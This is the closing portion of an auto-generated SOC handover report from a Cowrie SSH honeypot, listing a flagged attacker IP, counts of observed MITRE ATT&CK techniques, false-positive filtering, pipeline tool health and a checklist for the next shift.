| `49.142.79[.]72` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 11 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 33 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 14 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |

---

## 🔕 False Positive Summary (35 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 69 cases |
| Tool 34  | Credential Extractor        | ✅ 24 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 35 filtered (50.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 24 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-31T15:00:10Z_
